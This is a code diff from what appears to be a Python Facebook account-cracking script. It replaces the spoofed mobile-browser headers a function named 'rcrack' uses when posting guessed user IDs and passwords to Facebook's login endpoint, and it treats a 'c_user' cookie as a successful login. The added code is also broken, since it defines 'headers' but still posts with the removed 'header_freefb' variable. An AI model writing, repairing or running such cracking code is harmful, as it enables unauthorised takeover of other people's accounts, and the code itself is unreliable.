@@ -812,23 +812,28 @@ def rcrack(uid,pwx,tl):
 			"login":"Log In"}
 			
 			header_freefb = {
-			'authority': 'm.facebook.com',
-			'method': 'GET',
-			'path': '/login/device-based/login/async/',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'referer': 'https://x.facebook.com',
-			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="99", "Chromium";v="105"',
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Andriod"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'upgrade-insecure-requests': '1',
-			'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;][FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
-			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+			headers = {
+    'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'dpr': '1.8000000715255737',
+    'referer': 'https://p.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"M2006C3LI"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
+    
+			}
+						lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			
 			if 'c_user' in log_cookies:
